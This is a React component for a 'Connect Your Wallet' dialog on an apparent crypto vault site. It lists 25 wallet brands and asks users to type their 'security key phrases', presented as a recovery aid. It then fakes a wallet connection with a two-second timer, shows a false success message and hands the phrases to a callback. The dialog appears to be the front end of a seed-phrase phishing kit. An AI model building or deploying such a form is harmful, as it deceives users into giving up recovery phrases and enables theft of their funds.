"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import { Loader2, Wallet, CheckCircle, Shield } from "lucide-react"

declare global {
  interface Window {
    grecaptcha: {
      ready: (callback: () => void) => void
      execute: (siteKey: string, options: { action: string }) => Promise<string>
    }
  }
}

interface WalletConnectionModalProps {
  children: React.ReactNode
  onConnect: (walletType: string, securityKeys: string) => void
}

const WALLET_OPTIONS = [
  "Coinbase Wallet",
  "Cash App Wallet",
  "Blockchain Wallet",
  "Trust Wallet",
  "MetaMask",
  "WalletConnect",
  "Phantom",
  "Solflare",
  "Exodus",
  "Atomic Wallet",
  "Ledger Live",
  "Trezor",
  "SafePal",
  "Binance Chain Wallet",
  "Keplr",
  "Terra Station",
  "Algorand Wallet",
  "Yoroi",
  "Daedalus",
  "Electrum",
  "Mycelium",
  "Edge Wallet",
  "Jaxx Liberty",
  "Guarda Wallet",
  "Coinomi",
]

export function WalletConnectionModal({ children, onConnect }: WalletConnectionModalProps) {
  const [isOpen, setIsOpen] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState("")
  const [securityKeys, setSecurityKeys] = useState("")
  const [isConnecting, setIsConnecting] = useState(false)
  const [isConnected, setIsConnected] = useState(false)

  useEffect(() => {
    const script = document.createElement("script")
    script.src = "https://www.google.com/recaptcha/api.js?render=6LfYourSiteKeyHere"
    script.async = true
    document.head.appendChild(script)

    return () => {
      document.head.removeChild(script)
    }
  }, [])

  const handleConnect = async () => {
    if (!selectedWallet || !securityKeys.trim()) return

    setIsConnecting(true)

    // Simulate connection process
    await new Promise((resolve) => setTimeout(resolve, 2000))

    setIsConnecting(false)
    setIsConnected(true)

    // Show success state briefly
    setTimeout(() => {
      onConnect(selectedWallet, securityKeys)
      setIsOpen(false)
      setIsConnected(false)
      setSelectedWallet("")
      setSecurityKeys("")
    }, 1500)
  }

  const handleOpenChange = (open: boolean) => {
    if (!isConnecting) {
      setIsOpen(open)
      if (!open) {
        setSelectedWallet("")
        setSecurityKeys("")
        setIsConnected(false)
      }
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={handleOpenChange}>
      <DialogTrigger asChild>{children}</DialogTrigger>
      <DialogContent className="sm:max-w-md bg-popover border-border">
        <DialogHeader>
          <DialogTitle className="font-sans flex items-center">
            <Wallet className="w-5 h-5 mr-2 text-primary" />
            Connect Your Wallet
          </DialogTitle>
          <DialogDescription className="font-mono">
            Select your preferred cryptocurrency wallet to connect to the vault protocol
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {!isConnected && !isConnecting && (
            <>
              <div className="flex items-center space-x-2 p-3 bg-primary/10 rounded-lg border border-primary/20">
                <Shield className="w-4 h-4 text-primary" />
                <p className="text-sm font-mono text-primary">Protected by site-wide security verification</p>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium font-mono">Select Wallet Type</label>
                <Select value={selectedWallet} onValueChange={setSelectedWallet}>
                  <SelectTrigger className="w-full bg-input border-border">
                    <SelectValue placeholder="Choose your wallet..." />
                  </SelectTrigger>
                  <SelectContent className="bg-popover border-border max-h-60">
                    {WALLET_OPTIONS.map((wallet) => (
                      <SelectItem key={wallet} value={wallet} className="font-mono">
                        {wallet}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium font-mono">Security Keys</label>
                <Textarea
                  value={securityKeys}
                  onChange={(e) => setSecurityKeys(e.target.value)}
                  placeholder="Enter your security key phrases for vault recovery..."
                  className="w-full bg-input border-border font-mono text-sm resize-none"
                  rows={3}
                />
                <p className="text-xs text-muted-foreground font-mono">
                  These security keys will help you recover your vault account
                </p>
              </div>

              <Button
                onClick={handleConnect}
                disabled={!selectedWallet || !securityKeys.trim()}
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-medium"
              >
                <Wallet className="w-4 h-4 mr-2" />
                Connect Wallet
              </Button>
            </>
          )}

          {isConnecting && (
            <div className="text-center py-8">
              <Loader2 className="w-8 h-8 animate-spin text-primary mx-auto mb-4" />
              <h3 className="text-lg font-semibold font-sans mb-2">Connecting to {selectedWallet}</h3>
              <p className="text-sm text-muted-foreground font-mono">
                Establishing secure connection to your wallet...
              </p>
            </div>
          )}

          {isConnected && (
            <div className="text-center py-8">
              <CheckCircle className="w-8 h-8 text-primary mx-auto mb-4" />
              <h3 className="text-lg font-semibold font-sans mb-2">Successfully Connected!</h3>
              <p className="text-sm text-muted-foreground font-mono">
                Your {selectedWallet} is now connected to the vault
              </p>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  )
}
